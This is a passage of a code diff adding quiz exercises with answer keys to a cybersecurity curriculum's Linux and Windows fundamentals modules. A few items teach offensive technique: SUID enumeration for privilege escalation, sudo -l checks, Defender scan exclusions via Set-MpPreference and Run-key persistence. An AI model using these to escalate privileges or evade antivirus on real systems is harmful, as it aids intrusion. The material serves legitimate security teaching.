+              },
+              {
+                "left": "which",
+                "right": "Find the path of a binary"
+              }
+            ],
+            "explanation": "find searches the live filesystem flexibly, locate uses a prebuilt (possibly stale) index, and which resolves a binary's path."
+          }
+        ],
         moduleId: "m3-linux",
         number: 27,
         title:
@@ -4091,6 +5058,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each redirection or pipe operator to its effect.",
+            "pairs": [
+              {
+                "left": ">",
+                "right": "Overwrite stdout to a file"
+              },
+              {
+                "left": ">>",
+                "right": "Append stdout to a file"
+              },
+              {
+                "left": "2>",
+                "right": "Redirect stderr only"
+              },
+              {
+                "left": "|",
+                "right": "Pipe stdout into the next command"
+              },
+              {
+                "left": "tee",
+                "right": "Write to terminal and a file at once"
+              }
+            ],
+            "explanation": "Linux streams are 0/stdin, 1/stdout, 2/stderr; redirection and pipes route them between files and programs."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Suppress noisy permission-denied errors while keeping successful output.",
+            "template": "ls /home /root ___/dev/null",
+            "blanks": [
+              "2>"
+            ],
+            "explanation": "2>/dev/null redirects stderr into the discard file /dev/null, hiding error noise while stdout still prints.",
+            "distractors": [
+              ">",
+              "2>>"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 28,
         title:
@@ -4224,6 +5233,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each octal digit to its permission string.",
+            "pairs": [
+              {
+                "left": "7",
+                "right": "rwx"
+              },
+              {
+                "left": "6",
+                "right": "rw-"
+              },
+              {
+                "left": "5",
+                "right": "r-x"
+              },
+              {
+                "left": "4",
+                "right": "r--"
+              },
+              {
+                "left": "0",
+                "right": "---"
+              }
+            ],
+            "explanation": "Octal sums read=4, write=2, execute=1, so 7=rwx, 6=rw-, 5=r-x, 4=r--, 0=---."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "List every SUID-root binary on the box (the first move in manual privesc enumeration).",
+            "template": "find / -perm -___ -type f 2>/dev/null",
+            "blanks": [
+              "4000"
+            ],
+            "explanation": "4000 is the SUID bit; an SUID binary runs with its owner's (often root's) privileges regardless of who executes it.",
+            "distractors": [
+              "2000",
+              "1000"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 29,
         title: "File Permissions (chmod, chown, chgrp, SUID, SGID, Sticky Bit)",
@@ -4379,6 +5430,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each man page section number to what it documents.",
+            "pairs": [
+              {
+                "left": "1",
+                "right": "Executable commands"
+              },
+              {
+                "left": "2",
+                "right": "System calls (kernel functions)"
+              },
+              {
+                "left": "5",
+                "right": "File formats (e.g. /etc/passwd)"
+              },
+              {
+                "left": "8",
+                "right": "System administration commands"
+              }
+            ],
+            "explanation": "Man pages are split into numbered sections; the same name can differ by section, e.g. man 1 passwd vs man 5 passwd."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Read the /etc/passwd file format rather than the passwd command.",
+            "template": "man ___ passwd",
+            "blanks": [
+              "5"
+            ],
+            "explanation": "Section 5 covers file formats, so man 5 passwd documents /etc/passwd; section 1 would document the passwd command.",
+            "distractors": [
+              "1",
+              "8"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 30,
         title: "Man Pages & Help System",
@@ -4572,6 +5661,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each process-management command or key to its action.",
+            "pairs": [
+              {
+                "left": "ps -ef",
+                "right": "List all processes in Standard syntax"
+              },
+              {
+                "left": "Ctrl+Z",
+                "right": "Suspend a process into a Stopped state"
+              },
+              {
+                "left": "bg",
+                "right": "Resume a stopped process in the background"
+              },
+              {
+                "left": "nohup",
+                "right": "Keep a process running after logout"
+              },
+              {
+                "left": "$?",
+                "right": "Holds the last command's exit code"
+              }
+            ],
+            "explanation": "ps supports Standard (-ef) and BSD (aux) syntaxes; Ctrl+Z suspends, fg/bg resume, and nohup survives logout."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the exit-code convention.",
+            "template": "An exit code of ___ conventionally means success; non-zero means failure.",
+            "blanks": [
+              "0"
+            ],
+            "explanation": "$? holds the last command's exit code: 0 means success, and non-zero (most commonly 1) means failure.",
+            "distractors": [
+              "1",
+              "200"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 31,
         title: "Process Management (ps, top, htop, kill, bg, fg, nohup)",
@@ -4734,6 +5865,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each user/group command or file to its role.",
+            "pairs": [
+              {
+                "left": "id",
+                "right": "Shows UID, GID, and all groups"
+              },
+              {
+                "left": "whoami",
+                "right": "Shows just the current username"
+              },
+              {
+                "left": "sudo -l",
+                "right": "Lists what you may run as root"
+              },
+              {
+                "left": "/etc/shadow",
+                "right": "Stores the real password hashes"
+              },
+              {
+                "left": "usermod -aG",
+                "right": "Adds a user to a group, keeping existing ones"
+              }
+            ],
+            "explanation": "sudo -l is a key privesc check; the -a in usermod -aG appends rather than replacing group memberships."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "State root's identifiers.",
+            "template": "The root account always has UID and GID ___.",
+            "blanks": [
+              "0"
+            ],
+            "explanation": "root is UID/GID 0 with access to everything, which is why day-to-day work uses sudo instead of logging in as root.",
+            "distractors": [
+              "1",
+              "1000"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 32,
         title:
@@ -4918,6 +6091,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to stand up the Samba service on a fresh box.",
+            "items": [
+              "Install the package (sudo apt-get install samba)",
+              "Enable the service so it starts on every boot",
+              "Start the service for the current session"
+            ],
+            "explanation": "Samba must be installed, enabled, and started as separate steps; enable persists across reboots while start only runs it now."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each systemctl subcommand to what it does.",
+            "pairs": [
+              {
+                "left": "start",
+                "right": "Runs a service now only"
+              },
+              {
+                "left": "enable",
+                "right": "Makes it persist across reboots"
+              },
+              {
+                "left": "stop",
+                "right": "Sends SIGTERM (signal 15)"
+              },
+              {
+                "left": "disable",
+                "right": "Stops future auto-start, leaves it running"
+              },
+              {
+                "left": "status",
+                "right": "Shows Loaded/Active/Main PID"
+              }
+            ],
+            "explanation": "Conflating start (now only) with enable (persist on boot) is a common misconfiguration worth checking on any box you assess."
+          }
+        ],
         moduleId: "m3-linux",
         number: 33,
         title: "Starting & Stopping Services (systemctl, service)",
@@ -5055,6 +6267,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-10",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each networking command or interface to its purpose.",
+            "pairs": [
+              {
+                "left": "ip a",
+                "right": "Show interfaces and assigned IPs"
+              },
+              {
+                "left": "ss",
+                "right": "Modern replacement for netstat"
+              },
+              {
+                "left": "tcpdump",
+                "right": "Live packet capture"
+              },
+              {
+                "left": "iptables",
+                "right": "Filter traffic / firewall rules"
+              },
+              {
+                "left": "lo",
+                "right": "Loopback interface for local troubleshooting"
+              }
+            ],
+            "explanation": "ip a has replaced legacy ifconfig/iwconfig, and ss has replaced netstat, though the old tools still appear in the field."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Allow inbound SSH through the firewall (the canonical iptables example).",
+            "template": "iptables -A INPUT -p tcp --dport ___ -j ___",
+            "blanks": [
+              "22",
+              "ACCEPT"
+            ],
+            "explanation": "SSH listens on TCP port 22, and the ACCEPT target lets the matched inbound traffic through the firewall.",
+            "distractors": [
+              "443",
+              "DROP"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 34,
         title: "Network Commands (ifconfig/ip, netstat, ss, tcpdump, iptables)",
@@ -5242,6 +6497,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-11",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each package-management command to what it does.",
+            "pairs": [
+              {
+                "left": "apt update",
+                "right": "Refresh the package index"
+              },
+              {
+                "left": "apt upgrade",
+                "right": "Install newer versions of installed packages"
+              },
+              {
+                "left": "dpkg -i",
+                "right": "Install a local .deb file directly"
+              },
+              {
+                "left": "apt-get autoremove",
+                "right": "Remove unused dependency packages"
+              },
+              {
+                "left": "apt-get clean",
+                "right": "Clear the downloaded package cache"
+              }
+            ],
+            "explanation": "Debian-based distros use APT/dpkg; autoremove and clean reclaim disk from orphaned deps and cached package files."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the RPM-based package managers.",
+            "template": "On CentOS, Fedora, and RHEL the RPM-based package managers are yum and ___.",
+            "blanks": [
+              "dnf"
+            ],
+            "explanation": "yum/dnf are the Red Hat (RPM) equivalents of APT/dpkg used on Debian-based distros.",
+            "distractors": [
+              "apt",
+              "dpkg"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 35,
         title: "Package Management (apt, apt-get, dpkg, yum/dnf)",
@@ -5397,6 +6694,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-12",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Set up SSH key-based authentication.",
+            "template": "Generate a keypair with ___ , then place the public key in ~/.ssh/___ on the server.",
+            "blanks": [
+              "ssh-keygen",
+              "authorized_keys"
+            ],
+            "explanation": "ssh-keygen creates the keypair; the public key goes in the server's ~/.ssh/authorized_keys to permit key-based login.",
+            "distractors": [
+              "ssh-copy",
+              "known_hosts"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each SSH tool or file to its role.",
+            "pairs": [
+              {
+                "left": "ssh",
+                "right": "Secure encrypted remote shell access"
+              },
+              {
+                "left": "scp",
+                "right": "Copy files securely over SSH"
+              },
+              {
+                "left": "ssh-keygen",
+                "right": "Generate a public/private keypair"
+              },
+              {
+                "left": "authorized_keys",
+                "right": "Holds public keys allowed to log in"
+              }
+            ],
+            "explanation": "SSH gives encrypted remote access; scp reuses cp-style syntax with a host prefix to copy files over that channel."
+          }
+        ],
         moduleId: "m3-linux",
         number: 36,
         title: "SSH & Remote Access (ssh, scp, ssh-keygen)",
@@ -5514,6 +6850,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-13",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the time fields of a crontab line (before the command).",
+            "items": [
+              "minute",
+              "hour",
+              "day of month",
+              "month",
+              "day of week"
+            ],
+            "explanation": "A crontab line is: minute hour day month weekday command, giving fixed scheduling down to the minute."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Edit your personal (user) cron jobs.",
+            "template": "crontab ___",
+            "blanks": [
+              "-e"
+            ],
+            "explanation": "crontab -e edits the current user's cron jobs; system-wide jobs instead live in /etc/crontab and /etc/cron.d/.",
+            "distractors": [
+              "-l",
+              "-r"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 37,
         title: "Cron Jobs & Task Automation (crontab -e)",
@@ -5628,6 +6991,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-14",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Bandit technique to the problem it solves.",
+            "pairs": [
+              {
+                "left": "ls -la",
+                "right": "List hidden dotfiles"
+              },
+              {
+                "left": "file",
+                "right": "Identify a human-readable file's type"
+              },
+              {
+                "left": "base64 -d",
+                "right": "Decode base64-encoded data"
+              },
+              {
+                "left": "cat ./-",
+                "right": "Read a file literally named '-'"
+              }
+            ],
+            "explanation": "Each Bandit level forces you to combine a new command with prior ones to locate the next level's password."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Locate a file across the whole filesystem by its attributes while hiding errors.",
+            "template": "find / -size <n>c -user <owner> -group <group> 2>___",
+            "blanks": [
+              "/dev/null"
+            ],
+            "explanation": "Redirecting stderr to /dev/null discards the permission-denied noise so only the matching file's path is shown.",
+            "distractors": [
+              "/dev/zero",
+              "stdout"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 38,
         title: "OverTheWire: Bandit Levels 0-10",
@@ -5747,6 +7148,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-15",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to build and run an enumeration Bash script.",
+            "items": [
+              "Add the shebang line #!/bin/bash",
+              "Write the enumeration commands (users, processes, ports)",
+              "Make the script executable with chmod +x",
+              "Run it directly with ./script.sh"
+            ],
+            "explanation": "The shebang tells the system which interpreter to use, and chmod +x is required before the script can run as ./script.sh."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "List local usernames from the accounts file.",
+            "template": "cut -d: -f1 ___",
+            "blanks": [
+              "/etc/passwd"
+            ],
+            "explanation": "/etc/passwd stores one user per line with colon-separated fields, so cut -d: -f1 extracts just the usernames.",
+            "distractors": [
+              "/etc/shadow",
+              "/etc/group"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 39,
         title: "Bash Script: Enumerate users & running processes",
@@ -5961,6 +7388,44 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m3-windows-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each component or event to its correct privilege level / consequence.",
+            "pairs": [
+              {
+                "left": "User Mode",
+                "right": "Ring 3 (restricted)"
+              },
+              {
+                "left": "Kernel Mode",
+                "right": "Ring 0 (full hardware access)"
+              },
+              {
+                "left": "Kernel crash",
+                "right": "BSOD affecting the whole system"
+              },
+              {
+                "left": "User Mode app crash",
+                "right": "Affects only that process"
+              }
+            ],
+            "explanation": "User Mode (Ring 3) is sandboxed so one app's crash is isolated, while Kernel Mode (Ring 0) has full control, so a kernel fault takes down the entire system as a BSOD."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the sentence about how a process crosses into Kernel Mode on 64-bit Windows.",
+            "template": "On x64 systems, a Windows API call transitions into Kernel Mode by issuing the ___ instruction.",
+            "blanks": [
+              "syscall"
+            ],
+            "explanation": "On x64 Windows the transition from User Mode to Kernel Mode is performed with the dedicated syscall instruction (older/other paths use software interrupts).",
+            "distractors": [
+              "sysenter",
+              "int 0x80"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 40,
         title: "Windows Versions & Architecture (User Mode vs Kernel Mode)",
@@ -6123,6 +7588,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each CMD command to what it does.",
+            "pairs": [
+              {
+                "left": "cd",
+                "right": "Change directory"
+              },
+              {
+                "left": "dir",
+                "right": "List a directory's contents"
+              },
+              {
+                "left": "copy",
+                "right": "Duplicate a file"
+              },
+              {
+                "left": "move",
+                "right": "Relocate or rename a file"
+              },
+              {
+                "left": "del",
+                "right": "Delete files"
+              }
+            ],
+            "explanation": "These are the core CMD file-navigation and management verbs: cd/dir for moving and listing, and copy/move/del for duplicating, relocating, and deleting files."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the icacls permission token that grants a user full control of a file.",
+            "template": "icacls filename.txt /grant UserName:___ grants a user full control.",
+            "blanks": [
+              "F"
+            ],
+            "explanation": "In icacls the permission code F means Full control; RX is read/execute and M is modify.",
+            "distractors": [
+              "RX",
+              "M"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 41,
         title:
@@ -6328,6 +7835,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the rule for how NTFS and share permissions combine.",
+            "template": "When NTFS and share permissions both apply, the ___ of the two wins.",
+            "blanks": [
+              "most restrictive"
+            ],
+            "explanation": "NTFS and share permissions stack, and effective access is the most restrictive of the two.",
+            "distractors": [
+              "least restrictive",
+              "sum"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each NTFS feature to its function.",
+            "pairs": [
+              {
+                "left": "Alternate Data Streams (ADS)",
+                "right": "Can hide data/malware in a file"
+              },
+              {
+                "left": "Journaling",
+                "right": "Logs changes before commit for crash recovery"
+              },
+              {
+                "left": "EFS",
+                "right": "Per-file/folder encryption"
+              },
+              {
+                "left": "ACLs",
+                "right": "Per-file/folder access permissions"
+              }
+            ],
+            "explanation": "NTFS supports ACL-based permissions, EFS encryption, journaling for crash recovery, and ADS, which attackers sometimes abuse to hide data."
+          }
+        ],
         moduleId: "m3-windows",
         number: 42,
         title: "NTFS File System & Permissions",
@@ -6436,6 +7981,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the malicious-installer registry persistence incident in order.",
+            "items": [
+              "A malicious .msi installer is executed",
+              "The installer modifies the HKCU\\...\\Run key",
+              "A shutdown command is added to the Run key",
+              "The machine shuts down on every subsequent login"
+            ],
+            "explanation": "The Run key auto-launches whatever it points to at login, so adding a shutdown command there forces the machine to shut down each time the user logs in."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each registry element to its role.",
+            "pairs": [
+              {
+                "left": "HKEY_LOCAL_MACHINE",
+                "right": "System-wide configuration"
+              },
+              {
+                "left": "HKEY_CURRENT_USER",
+                "right": "Per-user configuration"
+              },
+              {
+                "left": "Run key",
+                "right": "Auto-launches programs at login"
+              },
+              {
+                "left": "regedit",
+                "right": "GUI registry editor"
+              }
+            ],
+            "explanation": "HKLM holds system-wide settings and HKCU per-user settings; the Run key auto-starts programs at login, and regedit is the graphical editor (reg query/add work from scripts)."
+          }
+        ],
         moduleId: "m3-windows",
         number: 43,
         title: "Windows Registry (regedit, structure, common keys)",
@@ -6580,6 +8161,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-5",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command that creates a new local account.",
+            "template": "net user testuser Pass@123 ___ creates a new local account.",
+            "blanks": [
+              "/add"
+            ],
+            "explanation": "net user <name> <password> /add creates a local account; /del deletes one.",
+            "distractors": [
+              "/new",
+              "/create"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each user/group command to its purpose.",
+            "pairs": [
+              {
+                "left": "net user",
+                "right": "List all local accounts"
+              },
+              {
+                "left": "whoami",
+                "right": "Print current identity (DOMAIN\\Username)"
+              },
+              {
+                "left": "net localgroup administrators",
+                "right": "Show Administrators group members"
+              },
+              {
+                "left": "wmic useraccount get name,sid",
+                "right": "List accounts with their SIDs"
+              }
+            ],
+            "explanation": "net user enumerates local accounts, whoami confirms the current identity/context, net localgroup administrators lists admins, and wmic useraccount exposes SIDs for privilege analysis."
+          }
+        ],
         moduleId: "m3-windows",
         number: 44,
         title: "User & Group Management (net user, whoami, UAC, Group Policy)",
@@ -6764,6 +8383,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each ACL term to its meaning.",
+            "pairs": [
+              {
+                "left": "DACL",
+                "right": "Permissions for users/groups"
+              },
+              {
+                "left": "SACL",
+                "right": "Auditing rules for access attempts"
+              },
+              {
+                "left": "ACE",
+                "right": "An individual rule inside an ACL"
+              },
+              {
+                "left": "SID",
+                "right": "Uniquely identifies a user/group"
+              }
+            ],
+            "explanation": "A DACL controls who can do what, a SACL defines what gets audited, ACEs are the individual entries, and SIDs are the identifiers those entries reference."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the icacls backup/restore pair.",
+            "template": "icacls /save backs up an ACL, and icacls ___ rolls it back.",
+            "blanks": [
+              "/restore"
+            ],
+            "explanation": "icacls /save writes out an ACL and /restore applies it back; /reset is different — it reverts to inherited defaults rather than a saved backup.",
+            "distractors": [
+              "/reset",
+              "/revert"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 45,
         title: "Windows ACL (Access Control List) & icacls",
@@ -6963,6 +8620,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-7",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the two taskkill flags that force-kill a process and its children.",
+            "template": "taskkill ___ ___ /IM forces termination of a process and its child-process tree.",
+            "blanks": [
+              "/F",
+              "/T"
+            ],
+            "explanation": "/F forces termination and /T includes the child-process tree, so /F /T /IM <name> kills the named process and everything it spawned.",
+            "distractors": [
+              "/PID"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each process/service command to what it does.",
+            "pairs": [
+              {
+                "left": "tasklist",
+                "right": "List running processes"
+              },
+              {
+                "left": "taskkill /PID 1234 /F",
+                "right": "Force-kill a process by its ID"
+              },
+              {
+                "left": "sc query",
+                "right": "Show a service's current state"
+              },
+              {
+                "left": "Get-Process -Name notepad",
+                "right": "Filter to a specific process by name"
+              }
+            ],
+            "explanation": "tasklist/taskkill are the ps/kill equivalents, sc query reports service state (RUNNING/STOPPED), and Get-Process -Name narrows output to one process."
+          }
+        ],
         moduleId: "m3-windows",
         number: 46,
         title: "Processes & Services (tasklist, taskkill, sc, services.msc)",
@@ -7158,6 +8853,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each PowerShell cmdlet to its purpose.",
+            "pairs": [
+              {
+                "left": "Get-Command",
+                "right": "Discover available cmdlets/functions/aliases"
+              },
+              {
+                "left": "Get-Help",
+                "right": "Show usage and examples for a cmdlet"
+              },
+              {
+                "left": "Invoke-Expression",
+                "right": "Execute a string as PowerShell code"
+              },
+              {
+                "left": "Update-Help",
+                "right": "Download the latest cmdlet documentation"
+              },
+              {
+                "left": "Set-ExecutionPolicy",
+                "right": "Control which scripts are allowed to run"
+              }
+            ],
+            "explanation": "Get-Command discovers what's available, Get-Help documents it (after Update-Help), Set-ExecutionPolicy gates script execution, and Invoke-Expression runs a string as code — a common living-off-the-land technique."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command that fully removes script-execution restrictions (a red flag during an assessment).",
+            "template": "Set-ExecutionPolicy ___ -Force removes script-execution restrictions entirely.",
+            "blanks": [
+              "Unrestricted"
+            ],
+            "explanation": "Unrestricted removes all script restrictions; RemoteSigned is a safer common default and Restricted blocks scripts entirely.",
+            "distractors": [
+              "RemoteSigned",
+              "Restricted"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 47,
         title:
@@ -7343,6 +9080,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-9",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each CMD recon command to what it reports.",
+            "pairs": [
+              {
+                "left": "systeminfo",
+                "right": "OS, patches, and hardware inventory"
+              },
+              {
+                "left": "ipconfig /flushdns",
+                "right": "Clear the local DNS cache"
+              },
+              {
+                "left": "netstat -ano",
+                "right": "Connections plus the owning process ID"
+              },
+              {
+                "left": "nslookup",
+                "right": "Query a DNS server directly"
+              }
+            ],
+            "explanation": "systeminfo inventories the host, ipconfig /flushdns clears the DNS cache, netstat -ano adds owning PIDs to active connections, and nslookup queries DNS directly."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the netstat flags that show all active connections and listening ports.",
+            "template": "netstat ___ shows all active connections and listening ports.",
+            "blanks": [
+              "-an"
+            ],
+            "explanation": "netstat -an lists all connections and listening ports numerically; -s shows per-protocol statistics and -ano adds the owning PID.",
+            "distractors": [
+              "-s",
+              "-r"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 48,
         title:
@@ -7567,6 +9342,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-10",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the PowerShell command that adds a Defender scan exclusion.",
+            "template": "Set-MpPreference ___ adds a folder Defender will skip scanning.",
+            "blanks": [
+              "-ExclusionPath"
+            ],
+            "explanation": "Set-MpPreference -ExclusionPath tells Defender to skip a folder — a technique used by both admins and attackers.",
+            "distractors": [
+              "-ExclusionExtension",
+              "-DisableRealtimeMonitoring"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Defender/Firewall command to its action.",
+            "pairs": [
+              {
+                "left": "Get-MpPreference",
+                "right": "View current Defender configuration"
+              },
+              {
+                "left": "MpCmdRun.exe -SignatureUpdate",
+                "right": "Update malware definitions"
+              },
+              {
+                "left": "MpCmdRun.exe -Scan -ScanType 2",
+                "right": "Run a full scan"
+              },
+              {
+                "left": "firewall.cpl",
+                "right": "Open the Windows Firewall Control Panel"
+              },
+              {
+                "left": "netsh advfirewall firewall delete rule",
+                "right": "Remove a firewall rule by name"
+              }
+            ],
+            "explanation": "Get-MpPreference reads Defender config, MpCmdRun handles signature updates and scans (ScanType 2 = full, 1 = quick), firewall.cpl opens the GUI, and netsh deletes firewall rules from CMD."
+          }
+        ],
         moduleId: "m3-windows",
         number: 49,
         title: "Windows Defender & Windows Firewall",
@@ -7806,6 +9623,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-11",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Windows Event ID to what it records.",
+            "pairs": [
+              {
+                "left": "4624",
+                "right": "Successful logon"
+              },
+              {
+                "left": "4625",
+                "right": "Failed logon"
+              },
+              {
+                "left": "4657",
+                "right": "Registry key modification"
+              },
+              {
+                "left": "1074",
+                "right": "System shutdown/restart initiated"
+              },
+              {
+                "left": "11707",
+                "right": "Product installation completed"
+              }
+            ],
+            "explanation": "Logon events (4624/4625) drive brute-force detection, 4657 catches registry Run-key changes (if auditing is on), 1074 logs shutdowns, and 11707 flags a completed software install."
+          },
+          {
+            "type": "order",
+            "prompt": "Reconstruct the incident by Event ID in timestamp order.",
+            "items": [
+              "Event ID 11707: installer completed successfully",
+              "Event ID 4657: registry Run key modified",
+              "Event ID 1074: shutdown initiated"
+            ],
+            "explanation": "Correlating the events by timestamp — install, then registry change, then shutdown — reconstructs the full attack timeline from otherwise-unrelated log entries."
+          }
+        ],
         moduleId: "m3-windows",
         number: 50,
         title: "Event Viewer & Windows Log Analysis",
@@ -7945,6 +9801,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-12",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the hardware component BitLocker relies on.",
+            "template": "BitLocker uses the ___ to seal the encryption key to the specific hardware.",
+            "blanks": [
+              "TPM"
+            ],
+            "explanation": "BitLocker binds the encryption key to the Trusted Platform Module (TPM), tying the drive to that specific hardware.",
+            "distractors": [
+              "HSM",
+              "BIOS"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each BitLocker fact to its detail.",
+            "pairs": [
+              {
+                "left": "TPM",
+                "right": "Seals the key to the hardware"
+              },
+              {
+                "left": "Recovery key",
+                "right": "Needed to read a drive removed from its machine"
+              },
+              {
+                "left": "Windows Pro and up",
+                "right": "Minimum edition that includes BitLocker"
+              },
+              {
+                "left": "Enterprise",
+                "right": "Adds Credential Guard & Device Guard"
+              }
+            ],
+            "explanation": "BitLocker (Pro and up, not Home) seals the key to the TPM, makes a removed drive unreadable without the recovery key, and on Enterprise is paired with Credential Guard and Device Guard."
+          }
+        ],
         moduleId: "m3-windows",
         number: 51,
         title: "BitLocker & Disk Encryption",
@@ -8062,6 +9956,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-13",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cmdlet/command to what the enumeration script collects with it.",
+            "pairs": [
+              {
+                "left": "Get-Process",
+                "right": "Running processes"
+              },
+              {
+                "left": "Get-LocalUser",
+                "right": "Local user accounts"
+              },
+              {
+                "left": "Get-ScheduledTask",
+                "right": "Scheduled tasks (persistence review)"
+              },
+              {
+                "left": "wmic process list brief",
+                "right": "Older CMD-based process list"
+              }
+            ],
+            "explanation": "The enumeration lab pulls processes, local users, and scheduled tasks via Get-Process/Get-LocalUser/Get-ScheduledTask, with wmic process list brief as the pre-PowerShell equivalent."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the pipeline that sorts processes so the heaviest CPU users appear first.",
+            "template": "Get-Process | Sort-Object -Property CPU ___ surfaces the heaviest processes first.",
+            "blanks": [
+              "-Descending"
+            ],
+            "explanation": "Sort-Object -Property CPU -Descending lists the biggest CPU consumers at the top, the scriptable version of Task Manager's Performance view.",
+            "distractors": [
+              "-Ascending",
+              "-Unique"
+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 52,
         title: "Lab: PowerShell script to enumerate processes & users",
@@ -8211,6 +10143,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-windows-14",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each TryHackMe Windows Fundamentals part to its focus.",
+            "pairs": [
+              {
+                "left": "Part 1",
+                "right": "OS structure, editions, and navigation"
+              },
+              {
+                "left": "Part 2",
+                "right": "System configuration, Control Panel, settings"
+              },
+              {
+                "left": "Part 3",
+                "right": "User management, UAC, and admin tools"
+              }
+            ],
+            "explanation": "The room series runs from OS structure and editions (Part 1), through system configuration (Part 2), to user management and administrative tools (Part 3)."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in which part of the room covers user management, UAC, and administrative tools.",
+            "template": "TryHackMe Windows Fundamentals Part ___ covers user management, UAC, and administrative tools.",
+            "blanks": [
+              "3"
+            ],
+            "explanation": "Part 3 of the series focuses on user management, UAC, and administrative tools; Part 1 covers editions/navigation and Part 2 covers system configuration.",
+            "distractors": [
+              "1",
+              "2"
